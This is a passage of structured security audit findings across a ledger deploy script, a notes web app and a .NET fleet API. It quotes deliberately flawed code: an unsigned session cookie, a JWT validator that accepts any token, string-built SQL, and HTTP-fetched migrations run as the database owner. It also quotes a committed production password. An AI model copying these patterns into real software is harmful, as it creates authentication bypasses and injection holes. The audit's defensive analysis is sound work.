findings.impact: Any local account reads every customer's statement bundle - financial records - and, because the mode is writable, can replace a bundle before the archiver or the reporting sidecar consumes it. That second half is the more serious: the directory is a hand-off point between processes, so it is an injection point into whatever downstream reads it.
findings.recommendation: Use a dedicated group with 2770 and setgid so new files inherit it, add the four consumers to that group, and drop the -R.

triage.reason: The comment names four distinct account identities using the directory, and 0777 admits every other account on the host as well.
The content is customer statement bundles from a ledger.
Multi-consumer access is intended; unrestricted write by every local account is not, and 0777 places no bound on it.

findings.title: Migrations are fetched over plaintext HTTP and executed as the schema owner
findings.evidence: curl -fsSL "${MIGRATION_MIRROR}/${ENVIRONMENT}/latest.tar.gz" on line 48, where MIGRATION_MIRROR is http://artifacts.internal.example/ledger/migrations (line 17) - plain http, no TLS. The archive is expanded with tar -xzf into STAGE_DIR (line 49) with no checksum, no signature and no --no-same-owner or path check, and every .sql it contains is then executed at lines 82-86 with psql -U ledger_owner, with PGPASSWORD set to the owner password (line 75). The comment on lines 40-45 makes clear this is the intended path for anything published since the checkout was cut.
findings.impact: Anyone able to answer or intercept that HTTP request - DNS spoofing, ARP, a compromised mirror, an internal proxy - supplies SQL that runs as the role owning the entire ledger schema, which is the role every RLS policy is written around. Separately, a crafted archive with ../ entries writes outside STAGE_DIR while the script runs with the rights needed to chmod /etc and /srv.
findings.recommendation: Serve the mirror over https, verify a detached signature or a pinned digest before extraction, extract with --no-same-owner into a scratch directory whose entries are checked, and apply the migrations under a role narrower than the schema owner.

triage.reason: There is no verification step anywhere between the fetch and psql -f.
The archive content is whatever answers the HTTP request; the transport offers no authenticity.
The mirror and any party on the network path are second principals with respect to the database host.

findings.unaided_label: ledger: http migration fetch executed as owner

findings.title: Role passwords are passed on the psql command line
findings.evidence: psql ... -c "ALTER ROLE ledger_app PASSWORD '${APP_PASSWORD}'" -c "ALTER ROLE ledger_report PASSWORD '${REPORT_PASSWORD}'" on lines 88-90. Both secrets are expanded into argv, which is world-readable through /proc for the life of the process. The script gets the transport right for the owner password on line 75 - export PGPASSWORD - so the safer mechanism was available and not used here. The values also land unquoted inside a single-quoted SQL literal, so a password containing an apostrophe breaks the statement.
findings.impact: Any local account sampling the process table during a deploy captures the application and reporting database passwords. Depending on the shell and logging configuration the same line can reach the shell history and the system audit log.
findings.recommendation: Feed the statements over stdin - printf "ALTER ROLE ledger_app PASSWORD %s" "$(quote)" | psql - or use \password, and quote_literal the value.

triage.reason: The values are live secrets from Vault (lines 55-56).
Every other local account on the deploy host can read /proc/*/cmdline.
No hidepid or equivalent mount option is configured anywhere in the tree.

findings.title: Tenant isolation rests on a session setting under transaction pooling
findings.evidence: pool_mode = transaction on line 18. Every RLS policy in 002_rls.sql routes through ledger.current_tenant(), which reads current_setting('app.tenant_id', true) - a session-scoped GUC (002_rls.sql:26). The header comment of 002_rls.sql:3-4 says every connection sets it right after checkout, and pgbouncer.ini:16-17 says the same: the app re-applies app.tenant_id on checkout. Under transaction pooling a server connection is returned to the pool at each transaction boundary and handed to a different client, so a value set with SET (rather than SET LOCAL inside the transaction that uses it) outlives the client that set it. server_reset_query = DISCARD ALL is configured on line 19, but it is server_reset_query_always that governs whether it runs in transaction mode, and that key is not set in this file.
findings.impact: A tenant's app.tenant_id can persist on a pooled connection and be inherited by the next client to receive it, or a client can begin work before re-applying it. Either way current_tenant() returns the wrong tenant and every policy in 002_rls.sql - which are all written as tenant_id = ledger.current_tenant() - authorises the wrong rows. This is the single control the whole isolation model depends on.
findings.recommendation: Set the value with SET LOCAL inside the same transaction as the statements that rely on it, or wrap it in set_config('app.tenant_id', $1, true). Add server_reset_query_always = 1 as a backstop and a test that runs two tenants' transactions across one pooled connection and asserts the second sees none of the first's rows.

triage.reason: RLS is the control and it consumes the GUC; it cannot compensate for the GUC being wrong. DISCARD ALL is configured but transaction mode does not run it without server_reset_query_always, which this file does not set.
Tenants are the second principal by construction.

The application code that issues the SET is not in this tree, so I cannot show whether it uses SET or SET LOCAL. Both comments describe a per-checkout SET, which is the unsafe form, but without the code the finding is capped at probable.

findings.unaided_label: ledger: transaction pooling vs session GUC
findings.what_would_settle_it: The application's connection-checkout hook: SET LOCAL inside the transaction rules it out, a plain SET at checkout confirms it.

findings.title: post_journal does not check that the accounts it posts to belong to the tenant
findings.evidence: The INSERT INTO entries on lines 60-66 takes (line ->> 'account_id')::bigint straight from the caller's JSON and pairs it with v_tenant. tenant_id is forced to the caller's own tenant, so entries_write's WITH CHECK (002_rls.sql:73) is satisfied, and the foreign key to ledger.accounts (001_schema.sql:63) is enforced by the system, which does not apply RLS. Nothing joins the referenced account back to v_tenant. The function does validate the other input thoroughly - the balance check on lines 47-54 - so the omission is specific to this field.
findings.impact: A caller can post journal lines referencing another tenant's account id. The rows carry the caller's tenant_id so the victim does not see them, which bounds the damage, but the foreign key gives a clean existence oracle: a line naming account id N succeeds if N exists in any tenant and fails if it does not, enumerating other tenants' account ids. The caller's own ledger is left referencing rows it cannot read.
findings.recommendation: Resolve each account_id against ledger.accounts with tenant_id = v_tenant before inserting, and raise if any line does not resolve.

triage.reason: RLS constrains the rows written, not the ids they may name; the FK check runs outside RLS.
account_id comes from the p_lines JSON supplied by the caller.

The written rows stay inside the caller's tenant, so the impact is an enumeration oracle and referential corruption rather than cross-tenant data exposure; severity is low on that basis and the finding is recorded.

findings.title: The session cookie is unsigned base64 JSON
findings.evidence: readSession base64url-decodes the cookie, JSON.parses it and returns the fields (lines 27-44). There is no signature, no MAC and no server-side lookup - the only checks are that userId, workspaceId and issuedAt are present (line 30) and that issuedAt is within 12 hours (line 34), and issuedAt is supplied by the same attacker. writeSession (line 51) confirms the format: Buffer.from(JSON.stringify(session)).toString('base64url'), with nothing added. The import on line 1 pulls in createHash but it is used only by the dead legacy helper. The doc comment on lines 17-19 talks about httpOnly, which is about who can read the cookie and not about whether the server should believe it.
findings.impact: Anyone can mint a cookie for any userId, any workspaceId and role 'admin' and be that user. This is the root of the workspace's authentication, consumed by middleware.ts:27, app/actions/notes.ts:22 and app/api/share/route.ts:36, so it is a complete authentication bypass and it also removes the one precondition that would otherwise bound F-041 and F-042.
findings.recommendation: Sign the payload with an HMAC over a server secret and verify it with a timing-safe comparison before trusting any field, or better, store an opaque random identifier and keep the session server-side. Treat every outstanding cookie as forged.

triage.reason: No layer verifies the cookie; middleware.ts:27 calls this same function and believes its result.
The cookie is entirely under the client's control.
JSON.parse does not authenticate; the absence of a MAC is the defect.

findings.title: The share route has no authentication and the middleware is configured not to cover it
findings.evidence: The handler validates the target (line 26), fetches the note by the caller's id with getNote(body.noteId) (line 30) and POSTs its full title and rendered html upstream (lines 38-47) before it ever looks at a session. readSession is called on line 36 and its result is used only as the audit field on line 49 - session?.userId ?? 'unknown' - with the ?? proving a missing session is an accepted case. The middleware cannot cover the gap: its matcher on middleware.ts:45 is '/((?!api|_next/static|_next/image|favicon.ico).*)', which excludes every route handler, and the comment on lines 43-44 says that exclusion is deliberate.
findings.impact: An unauthenticated caller who knows or guesses a note id has its contents delivered to one of three configured third-party endpoints, and the share is recorded as having been performed by 'unknown'. There is no ownership check either, so this is unauthenticated exfiltration of any note in any workspace.
findings.recommendation: Require a session at the top of the handler and return 401 without one, then check that the note's workspace_id matches the session's before fetching or forwarding. Since the matcher deliberately excludes /api, that check has to live in the handler.

triage.reason: The middleware matcher explicitly excludes api routes (middleware.ts:45), so no unskippable layer applies to this handler.
noteId comes from the request body (line 20).
Notes are workspace-private content; the app gates every other route on a session.

findings.title: updateNoteAction calls the session check and then ignores it
findings.evidence: Line 58 is currentSession(); - the return value is discarded, whereas recentNotes (line 32) and createNoteAction (line 39) both bind it and use session.workspaceId to scope (lines 35 and 46). What follows is getNote(input.id!) (line 66) and saveNote(input.id!, ...) (line 72), both keyed on the client-supplied id with no workspace comparison anywhere, and lib/db.ts confirms neither query filters by workspace (db.ts:20 and db.ts:47).
findings.impact: Any caller with a session - which, given F-039, is anyone - overwrites the title, source and rendered html of any note in any workspace by naming its uuid. The discarded call is what makes the handler read as authorized in review: the check runs, and its answer is thrown away.
findings.recommendation: Bind the session, load the note, and reject unless existing.workspace_id === session.workspaceId; or push the scope into the query - saveNote(id, workspaceId, fields) with WHERE id = $1 AND workspace_id = $2.

triage.reason: currentSession() only proves someone is signed in; nothing in the action or in lib/db.ts scopes by workspace.
input.id is read from the submitted FormData (line 61).
The two sibling actions in the same file bind and use the session, so this is an omission and not a different pattern.

findings.title: The note page renders any note by id with no workspace check
findings.evidence: NotePage calls getNote(params.id) (line 16) and renders the result; generateMetadata does the same on line 10, putting the title into the page metadata. lib/db.ts:20 is SELECT * FROM notes WHERE id = $1 with no workspace predicate. The page never reads the session and never compares note.workspace_id to anything - the only gate is middleware.ts:29, which checks that a session exists, not whose it is.
findings.impact: Any signed-in user reads any note in any workspace by uuid, including the full rendered body. generateMetadata leaks the title even on paths that would otherwise render nothing. Since the session is forgeable (F-039), the practical precondition is knowing a uuid.
findings.recommendation: Read the session in the page, pass workspaceId into the query, and return notFound() when it does not match, so an unauthorised id is indistinguishable from a missing one.

triage.reason: The middleware performs authentication only (middleware.ts:27-35); no authorization layer exists between it and the query.
params.id is the route segment.
Notes are workspace-private; the app's own listing path scopes by workspace (actions/notes.ts:35).
There is a separate '/shared' public prefix (middleware.ts:5), so /notes/[id] is not the intentionally public surface.

findings.unaided_label: notes: page.tsx reads any note by id

findings.title: The middleware reflects any Origin back with credentials allowed
findings.evidence: res.headers.set('Access-Control-Allow-Origin', origin) where origin is req.headers.get('origin') read on line 13, together with res.headers.set('Access-Control-Allow-Credentials', 'true') on line 17. There is no allowlist and no comparison of any kind - the comment on lines 10-12 says the desktop app, the extension and the marketing site each need the cookie to ride along, so hand back whichever origin asked. The Vary on line 18 makes the reflection cache correctly, which does not make it safe.
findings.impact: Any website a signed-in user visits can issue credentialed cross-origin requests to the workspace and read the responses - the same-origin policy is the control this removes. Combined with F-042 that is every note in the workspace, read from an attacker's page.
findings.recommendation: Compare the Origin against an explicit allowlist of the three known clients and echo it only on an exact match; give the desktop app and the extension a bearer token instead of the ambient cookie.

triage.reason: No allowlist exists; the header is copied through unconditionally.
The responses are authenticated workspace content.
Reflection with credentials is the documented failure mode of this pattern, not a benign variant of an allowlist.

findings.unaided_label: notes: middleware reflects Origin with credentials

findings.title: The legacy session verifier uses unkeyed MD5
findings.evidence: const expected = createHash('md5').update(salt + payload).digest('hex') compared with === on line 69. Three defects in one line: MD5, a hash(salt||message) construction rather than an HMAC - which is length-extendable, so a valid token can be extended into another valid token without the salt - and a non-constant-time comparison. The comment on lines 54-59 says the v2 sign-in flow stopped emitting the format and no caller in the app reads it, which grep confirms, but that it is kept for a backfill script in the ops repository.
findings.impact: Nothing in this application calls it. The exposure is the ops backfill script named in the comment, which would accept a forged token, and a broken verifier left in a module that the live session path also lives in.
findings.recommendation: Delete it. If the backfill still needs to read old cookies, give it a one-off copy with an HMAC-SHA256 verification and timingSafeEqual, and retire it on a date.

triage.reason: No caller exists in this tree, but the comment states a script in the ops repository still uses it and that repository is not in scope. Capped at probable.
payload is the cookie value, entirely attacker-supplied.

findings.what_would_settle_it: The ops backfill script and whether it still verifies v1.9 cookies.

findings.title: No Content-Security-Policy on an app that renders stored HTML
findings.evidence: The headers() block on lines 20-31 sets X-Content-Type-Options, Referrer-Policy and X-Frame-Options for /:path* and stops there - no Content-Security-Policy and no Strict-Transport-Security. The application renders stored markup with dangerouslySetInnerHTML (app/notes/[id]/page.tsx:33), so the only thing standing between a note and script execution is the markdown-it configuration in lib/policy.ts, and markdown-it is a caret dependency (package.json:14).
findings.impact: The renderer looks correct today - html is false and link schemes are constrained - so this is not itself an XSS. What it means is that the app has exactly one layer there: any regression in policy.ts, any change in a floating markdown-it minor, or any other injection point becomes immediately exploitable with nothing to contain it, and there is no HSTS to keep the session cookie off a plaintext request.
findings.recommendation: Add a CSP with a nonce and no unsafe-inline, plus Strict-Transport-Security, to the same headers() block.

triage.reason: The server-side sanitiser is present and, as configured, correct - this is defence in depth that is absent rather than a live hole, so it is bounded to low and recorded rather than dropped.
No CSP is delivered from anywhere else in the tree - the middleware sets only CORS and the x-nw-user header.

findings.title: JWT signature validation is replaced by a function that accepts everything
findings.evidence: SignatureValidator = (token, _) => new JwtSecurityToken(token). The delegate's contract is to validate and return the token; this one constructs a JwtSecurityToken from the raw string and returns it, which parses the payload and verifies nothing. The IssuerSigningKey built on lines 19-20 is therefore never consulted. The comment on lines 32-34 gives the reason: the JWKS fetch was adding a second to cold starts, so read the token straight through and lean on the issuer and audience checks - but iss and aud are unsigned payload fields, so an attacker sets them to the expected values. These parameters are wired into the only authentication scheme the app registers (Program.cs:21-25).
findings.impact: Anyone can mint a token with arbitrary claims. Because Program.cs:31-33 makes an authenticated user the fallback policy for every endpoint and Program.cs:35 defines fleet-admin as nothing more than a role claim, a self-issued token yields full administrative access: any tenant_id (DevicesController.cs:22), and firmware promotion to any channel (FirmwareController.cs:51-66), which is what the fleet installs.
findings.recommendation: Delete the SignatureValidator override. Use IssuerSigningKeyResolver or ConfigurationManager against the issuer's JWKS with a cached OpenID configuration - which solves the cold-start cost without removing the check - and pin ValidAlgorithms.

triage.reason: No other layer verifies the token; this is the only scheme registered and the fallback policy consumes its result.
The delegate is the validation hook itself, and constructing a JwtSecurityToken performs no cryptographic check.
BuildValidationParameters is called unconditionally at start-up (Program.cs:24), with no environment guard.

findings.title: SQL injection in the device serial search
findings.evidence: FromSqlRaw($"SELECT TOP 25 * FROM devices WHERE tenant_id = {TenantId} AND serial LIKE '%{q}%' ORDER BY serial"). The interpolated string is evaluated to a plain string before FromSqlRaw sees it, so nothing is parameterised - the safe overload for this shape is FromSql/FromSqlInterpolated, which takes the FormattableString and binds each hole. q is the [FromQuery] string on line 45, checked only for null-or-whitespace on line 47.
findings.impact: Any caller can terminate the literal and append arbitrary T-SQL, including the tenant_id predicate that is the isolation boundary for this multi-tenant fleet. Combined with F-046 that requires no valid credential at all.
findings.recommendation: Switch to FromSql($"...") - the interpolated overload - or FromSqlRaw with explicit SqlParameter values; keep the LIKE wildcards in the parameter, not in the statement text.

triage.reason: There is no query filter or interceptor; the tenant predicate is inside the same injectable string.
q is a query-string parameter.
This is the FromSqlRaw(string) overload receiving an already-interpolated string, not the FormattableString overload that would parameterise it.

findings.title: Device retirement is AllowAnonymous and unscoped
findings.evidence: [AllowAnonymous] on line 98 opts the DELETE out of the fallback policy that Program.cs:31-33 applies to every other endpoint, and the lookup on line 102 is FirstOrDefaultAsync(d => d.Id == id) with no TenantId predicate - unlike every sibling in the class, which all filter on d.TenantId == TenantId (lines 31, 68) or set it from the token (line 81). The comment on lines 93-96 explains that the support console calls it before the operator has finished the SSO hop, so it cannot depend on the bearer token being present.
findings.impact: An unauthenticated caller retires any device in any tenant by walking integer ids - a denial of service against a physical fleet, delivered by a single unauthenticated DELETE per device, with no record of who did it (F-052 means the LogInformation on line 112 is not written anywhere either).
findings.recommendation: Remove [AllowAnonymous] and scope the lookup to TenantId. If the console genuinely acts before the SSO hop completes, give it a short-lived pre-auth token bound to the device it is about to retire rather than opening the endpoint.

triage.reason: [AllowAnonymous] is what removes the fallback policy; nothing else in the pipeline authorizes (Program.cs:55-70).
The endpoint is exposed on the same public host as the rest of the controller, with app.MapControllers() at Program.cs:70.
Tenants are distinct principals and the handler crosses between them by omitting the predicate.

findings.title: The production database password is committed
findings.evidence: "Fleet": "Server=sql-fleet-prod.internal,1433;Database=Fleet;User Id=fleet_app;Password=Fl33tSvc-2024-prod;..." - a live production credential in a file that FleetApi.csproj:24-26 explicitly copies to the output directory, so it ships inside the build artifact as well as sitting in version control. The project does have a UserSecretsId (csproj line 8) and the sibling comment at appsettings.json:17 shows the team knows the real signing key comes from user secrets or the environment - that convention was applied to the JWT key and not to the connection string.
findings.impact: Anyone with repository access, or anyone who obtains the published output, has the production database credential for the fleet. It must be treated as compromised for the whole period it has been committed.
findings.recommendation: Move the connection string to the environment or a secret store, remove the CopyToOutputDirectory entry, rotate the password, and add secret scanning to CI.

triage.reason: It is a concrete password with a production naming convention, not a placeholder.
The file is named for the production environment and is copied into the build output by the csproj.

findings.unaided_label: fleet: prod DB password in appsettings.Production.json

findings.title: Token expiry is disabled in production and the clock skew is a day
findings.evidence: "ValidateLifetime": false (line 15) and "ClockSkewMinutes": 1440 (line 16), both consumed by TokenService.cs:29-30. The note on line 14 explains the intent: field gateways buffer telemetry for up to a day when a site loses backhaul and replay it with the token they were holding, so expiry cannot be enforced on arrival. The development file sets the same keys to true and 2 (appsettings.json:15-16), so this is specific to production. The two settings are also redundant with each other - a 24-hour skew would already be the workaround if lifetime validation were on.
findings.impact: Every token ever issued stays valid forever. There is no revocation path in the tree - IssueGatewayToken (TokenService.cs:39-60) mints a jti but nothing records or checks it - so a gateway token captured from a recalled or stolen unit authenticates indefinitely.
findings.recommendation: Re-enable ValidateLifetime and return the skew to minutes. Solve the buffering case at the protocol level: have gateways refresh a short-lived token on reconnect and carry the original event timestamp inside the signed payload rather than relying on the token to still be valid.

triage.reason: It is the production configuration file specifically; the development one has the opposite values.
No revocation list, introspection endpoint or jti store exists in the tree to compensate.
The offline-buffering need is real but nothing bounds the resulting validity window - it is unlimited, not 24 hours.

findings.title: Production is configured for a plaintext MQTT broker
findings.evidence: "BrokerUri": "tcp://mqtt-fleet-prod.internal:1883" with "TlsRequired": false (line 21). The development file is the reverse - tls://broker.localhost:8883 with TlsRequired true (appsettings.json:21-22) - so the downgrade is specific to production, and the note on line 19 gives the reason: the broker is on the same VPC subnet and the gateways cannot all be re-flashed with the CA bundle yet. Username fleet-api is configured on line 23 with no password key, and MQTTnet.AspNetCore is a declared dependency (FleetApi.csproj:18).
findings.impact: Fleet telemetry and any command traffic on that broker cross the network unencrypted and unauthenticated at the transport layer, so anyone with a position on the VPC subnet reads it and can publish to it. Same-subnet is a trust assumption, not a control.
findings.recommendation: Enable TLS on the broker and require it on the client. Stage it: run the TLS listener alongside 1883, migrate gateways as they are re-flashed, then close the plaintext port.

triage.reason: Nothing in the tree bounds the subnet - there is no network policy, security group or segmentation artifact here, only the assertion in the note.
No MQTT client code exists in the given files, so I cannot show the keys being read at runtime; MQTTnet.AspNetCore is referenced but unused in this excerpt. Capped at probable.
A subnet-level control could exist outside the repository; no artifact for one arrived.

findings.unaided_label: fleet: MQTT TlsRequired false in production
findings.what_would_settle_it: The MQTT client that reads the Mqtt section, and the VPC security-group or network-policy definition.

findings.title: Serilog is configured from a section that does not exist, so nothing is logged
findings.evidence: builder.Host.UseSerilog((ctx, cfg) => cfg.ReadFrom.Configuration(ctx.Configuration)) - ReadFrom.Configuration reads the "Serilog" section, and neither appsettings.json nor appsettings.Production.json contains one. I grepped both: the only logging keys are "Logging": {"LogLevel": ...}, which belongs to Microsoft.Extensions.Logging and supplies Serilog with no sinks. A Serilog logger with no WriteTo has nowhere to write, so app.UseSerilogRequestLogging() on line 57 and _log.LogInformation on DevicesController.cs:112 both produce nothing.
findings.impact: There is no application log. The one place the code records a state change - the retirement of a device - is written to a logger with no sink, and F-048 makes that endpoint unauthenticated. An incident on this service would leave no trace to reconstruct, which is the absence-of-logging half of the disclosure surface.
findings.recommendation: Add a Serilog section with the sinks the environment needs, or configure sinks in code, and add a start-up assertion that at least one sink is attached in production.

triage.reason: A Serilog section could be supplied by an environment variable or an external configuration provider; no such artifact is in the tree, so per FP-08 this is UNKNOWN and the finding is capped at probable.
The effect is loss of accountability rather than direct compromise, which sets severity at low; per FP-10 the finding is recorded.

findings.unaided_label: fleet: Serilog configured from missing section
findings.what_would_settle_it: An environment-supplied Serilog configuration, or a sink configured outside these files.

findings.title: The page parameter is unvalidated while size beside it is clamped
findings.evidence: size = Math.Clamp(size, 1, 200) on line 28 and nothing at all for page, which is used directly as .Skip((page - 1) * size) on line 33. page = 0 produces a negative OFFSET, which SQL Server rejects, and a large page overflows the multiplication.
